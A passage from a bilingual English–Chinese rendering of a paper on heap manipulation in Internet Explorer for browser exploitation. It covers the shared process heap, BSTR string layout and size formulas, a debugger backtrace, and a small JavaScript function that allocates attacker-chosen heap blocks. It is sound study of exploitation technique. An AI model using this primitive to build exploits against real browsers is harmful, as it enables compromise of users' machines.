style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>堆中。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象除外，</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象是被分配到进程默认堆里去的。一旦某个对象不再被引用了，垃圾回收机制就会析构这个对象。这个垃圾回收机制会在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>种情况下被激活，一种是在总的内存消耗或者对象的总数超过了某个极限的时候，再有就是我们显式的调用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>CollectGarbage()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数的时候。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
final component in most browser exploits is the ActiveX control that causes
heap corruption. Some ActiveX controls use a dedicated heap, but most allocate
and corrupt memory on the default process heap.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>最后一个组件是</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ActiveX</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>控制器，这个组件经常会出现堆腐烂的问题（至少在本文中漏洞是在</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>控制器中的）。有些</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>ActiveX</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>控制器会使用一个专用的堆，但是大多数</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>控制器则使用进程默认堆。</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>An
important observation is that all three components of Internet Explorer use the
same default process heap. This means that allocating and freeing memory with
JavaScript changes the layout of the heap used by MSHTML and ActiveX controls,
and a heap corruption bug in an ActiveX control can be used to overwrite memory
allocated by the other two browser components.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>我们必须注意到一个重要的事实：上述三个</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>IE</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>组件都是使用同一个进程默认堆的。这也就是说：在</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的一些堆分配动作会直接影响到</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>MSHTML</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>和</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>控制器所使用的堆的状况，而一个</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>ActiveX</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>控制器中的堆腐烂</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>bug</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>也可以用来覆盖分配给</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>HTML</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>元素或者</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript
string</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>对象的内存空间。</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript
strings<o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
JavaScript engine allocates most of its memory with the MSVCRT malloc() and
new() functions, using a dedicated heap created during CRT initialization. One
important exception is the data for JavaScript strings. They are stored as <a
href="http://msdn2.microsoft.com/en-us/library/ms221069.aspx">BSTR</a> strings,
a basic string type used by the COM interface. Their memory is allocated from
the default process heap by the SysAllocString family of functions in
OLEAUT32.DLL.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>引擎中绝大多数的内存分配是使用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>MSVCRT</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>malloc()</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>和</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>new()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数实现的。用这</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个函数分配的空间都是位于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>CRT</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>初始化时创建的一个专用的堆中的，但是一个比较重要的例外时</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象是以</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>BSTR string</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>格式（一种用于</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>COM</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>接口的基本</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>类型）存储的，它所需的空间是用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>OLEAUT32.DLL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>SysAllocString</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>系列函数分配到进程默认堆中的。</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Here
is a typical backtrace from a string allocation in JavaScript:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面给出的是一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>中分配一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>对象的调用回溯关系：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>ChildEBP RetAddr<span style='mso-spacerun:yes'>  </span>Args to Child<span style='mso-spacerun:yes'>              </span><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d<st1:chmetcnv
UnitName="C" SourceValue="26" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">26c</st1:chmetcnv> 77124b52 77606034 00002000 <st1:chmetcnv
UnitName="F" SourceValue="37" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">00037f</st1:chmetcnv>48 ntdll!RtlAllocateHeap+0xeac<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d280 <st1:chmetcnv
UnitName="C" SourceValue="77124" HasSpace="False" Negative="False"
NumberType="1" TCSC="0" w:st="on">77124c</st1:chmetcnv><st1:chmetcnv
UnitName="F" SourceValue="7" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">7f</st1:chmetcnv> 00002000 00000000 0013d<st1:chmetcnv
UnitName="a" SourceValue="2" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">2a</st1:chmetcnv>8 OLEAUT32!APP_DATA::AllocCachedMem+0x<st1:chmetcnv
UnitName="F" SourceValue="4" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">4f</st1:chmetcnv><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d290 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>61dd0 00000000 00184350 00000000 OLEAUT32!SysAllocStringByteLen+0x2e<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d<st1:chmetcnv
UnitName="a" SourceValue="2" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">2a</st1:chmetcnv>8 75caa763 00001ffa 0013d660 00037090 jscript!PvarAllocBstrByteLen+0x2e<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d<st1:chmetcnv
UnitName="C" SourceValue="31" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">31c</st1:chmetcnv> 75caa810 00037940 00038178 0013d660 jscript!JsStrSubstrCore+0x<st1:chmetcnv
UnitName="a" SourceValue="17" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">17a</st1:chmetcnv><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d<st1:chmetcnv
UnitName="C" SourceValue="33" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">33c</st1:chmetcnv> <st1:chmetcnv UnitName="C"
SourceValue="75" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">75c</st1:chmetcnv>6212e 00037940 0013d<st1:chmetcnv UnitName="a"
SourceValue="4" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">4a</st1:chmetcnv>8 0013d660 jscript!JsStrSubstr+0x1b<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d374 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>558e1 0013d660 00000002 00038988 jscript!NatFncObj::Call+0x41<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d408 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>5586e 00037940 00000000 00000003 jscript!NameTbl::InvokeInternal+0x218<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d434 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>62296 00037940 00000000 00000003 jscript!VAR::InvokeByDispID+0xd4<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d478 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv><st1:chmetcnv UnitName="C"
SourceValue="556" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">556c</st1:chmetcnv>5 00037940 0013d498 00000003 jscript!VAR::InvokeByName+0x164<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d4b8 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>54468 00037940 00000003 0013d660 jscript!VAR::InvokeDispName+0x43<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d4dc <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>54d<st1:chmetcnv UnitName="a"
SourceValue="1" HasSpace="False" Negative="False" NumberType="1" TCSC="0"
w:st="on">1a</st1:chmetcnv> 00037940 00000000 00000003 jscript!VAR::InvokeByDispID+0xfb<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>0013d6d0 <st1:chmetcnv
UnitName="C" SourceValue="75" HasSpace="False" Negative="False" NumberType="1"
TCSC="0" w:st="on">75c</st1:chmetcnv>544fa 0013da80 00000000 0013d7ec jscript!CScriptRuntime::Run+0x18fb<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
allocate a new string on the heap, we need to create a new JavaScript string
object. We cannot simply assign string literal to a new variable, because this
does not create a copy of the string data. Instead, we need to concatenate two
strings or use the substr function. For example:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>要在堆中分配一个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>对象，我们当然首先要创建一个新的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>JavaScript
string</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>对象。但是简单的声明一个新的变量并不会在堆中分配一块空间出来，因为这并不会创建</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的一份拷贝，要想达到我们的目的，我们需要连接</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>2</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>个</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>或者使用</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>substr()</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>函数，如下例：</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>var str1 = &quot;AAAAAAAAAAAAAAAAAAAA&quot;;<span style='mso-spacerun:yes'>  </span>// doesn't allocate a new string<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>var str2 = str1.substr(0, 10);<span style='mso-spacerun:yes'>      </span>// allocates a new 10 character string<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>var str3 = str1 + str2;<span style='mso-spacerun:yes'>             </span>// allocates a new 30 character string<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>BSTR
strings are stored in memory as a structure containing a four-byte size field,
followed by the string data as 16-bit wide characters, and a 16-bit null
terminator. The str1 string from the example above will have the following
representation in memory:<o:p></o:p></span></p>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>BSTR
string</span><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;
mso-hansi-font-family:Verdana;color:#404040'>在内存中的结构类似于一个结构体，它包括一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>4</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>字节的大小的域（表示</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的长度），紧接着</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的内容（每字符</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>16-bit</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>），最后以一个</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>NULL</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>结尾（</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>16-bit</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>）。如下图所示：</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:red'>string size</span><span lang=EN-US style='font-size:9.0pt;
color:#404040'> | </span><span lang=EN-US style='font-size:9.0pt;color:green'>string data</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                                 </span>| </span><span
lang=EN-US style='font-size:9.0pt;color:blue'>null terminator</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:red'>4 bytes</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>     </span>| </span><span
lang=EN-US style='font-size:9.0pt;color:green'>length / 2 bytes</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>                                        </span><span style='mso-spacerun:yes'>    </span>| </span><span
lang=EN-US style='font-size:9.0pt;color:blue'>2 bytes</span><span lang=EN-US
style='font-size:9.0pt;color:#404040'><o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>            </span>|<span style='mso-spacerun:yes'>                                                             </span>|<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:red'>14 00 00 00</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'> | </span><span lang=EN-US
style='font-size:9.0pt;color:green'>41 00 41 00 41 00 41 00 41 00 41 00 41 00 41 00 41 00 41 00</span><span
lang=EN-US style='font-size:9.0pt;color:#404040'> | </span><span lang=EN-US
style='font-size:9.0pt;color:blue'>00 00</span><span lang=EN-US
style='font-size:9.0pt;color:#404040'><o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>We
can use the following two formulas to calculate how many bytes will be
allocated for a string, or how long a string must be to allocate a certain
number of bytes:<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>下面给出</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>2</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>个公式，分别用于在已知</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>长度的情况下计算</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>将要被分配到的内存大小，以及在已知需要分配内存大小的情况下计算需要一个多长的</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>bytes = len * 2 + 6<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>len = (bytes - 6) / 2<o:p></o:p></span></pre>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>The
way strings are stored allows us to write a function that allocates a memory
block of an arbitrary size by allocating a new string. The code will calculate
the required string length using the </span><span class=code><span lang=EN-US
style='font-size:9.0pt;color:#404040'>len&nbsp;=&nbsp;(bytes-6)/2</span></span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'> formula,
and call substr to allocate a new string of that length. The string will
contain data copied from the padding string. If we want to put specific data
into the new memory block, we just need to initialize the padding string with
it beforehand.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>知道了</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>string</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>的存储方式，我们就能写出一个函数来分配我们所希望的任意大小的内存块的函数了。我们可以用</span><span
class=code><span lang=EN-US style='font-size:9.0pt;color:#404040'>len&nbsp;=&nbsp;(bytes-6)/2</span></span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>这个公式计算出分配我们所需大小的内存块需要的</span><span lang=EN-US
style='font-size:9.5pt;font-family:Verdana;color:#404040'>string</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的长度，然后调用</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>substr()</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>函数来分配空间。当然一般情况下（比如下面这个示例），新分配到的内存空间会被</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>padding</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>的内容，也就是‘</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>A</span><span style='font-size:9.5pt;
mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>’填充，如果我们需要控制内存块中的数据的话，我们也可以根据我们的需要去初始化</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>padding</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>。</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></p>

<pre style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;
color:#404040'>// Build a long string with padding data<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>padding = &quot;AAAA&quot;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>while (padding.length &lt; MAX_ALLOCATION_LENGTH)<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>padding = padding + padding;<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>// Allocate a memory block of a specified size in bytes<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>function alloc(bytes) {<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><span style='mso-spacerun:yes'>    </span>return padding.substr(0, (bytes-6)/2);<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'>}<o:p></o:p></span></pre><pre
style='margin-left:24.0pt'><span lang=EN-US style='font-size:9.0pt;color:#404040'><o:p>&nbsp;</o:p></span></pre>

<h3><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>Garbage
collection<o:p></o:p></span></h3>

<h3><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>垃圾收集机制</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'><o:p></o:p></span></h3>

<p><span lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>To
manipulate the browser heap layout it is not enough to be able to allocate
memory blocks of an arbitrary size, we also need a way to free them. The
JavaScript runtime uses a simple mark-and-sweep garbage collector, the most
detailed description of which is in a post on Eric Lippert's <a
href="http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx">blog</a>.<o:p></o:p></span></p>

<p><span style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>要完全控制浏览器的堆，光能随意分配任意大小的内存空间是不够的，我们还要能随意释放已分配到的内存空间。（不像</span><span
lang=EN-US style='font-size:9.5pt;font-family:Verdana;color:#404040'>C/C++</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>语言中程序员是显式调用</span><span lang=EN-US style='font-size:
9.5pt;font-family:Verdana;color:#404040'>delete/free</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>之类的函数）在</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>JavaScript runtime</span><span
style='font-size:9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:
Verdana;color:#404040'>中是使用一种简单的</span><span lang=EN-US style='font-size:9.5pt;
font-family:Verdana;color:#404040'>mark-and-sweep</span><span style='font-size:
9.5pt;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;color:#404040'>（不知道有没有标准的译名，古存疑，保留英语原文）的垃圾处理机制来释放已经不被使用的内存空间的，在</span><span
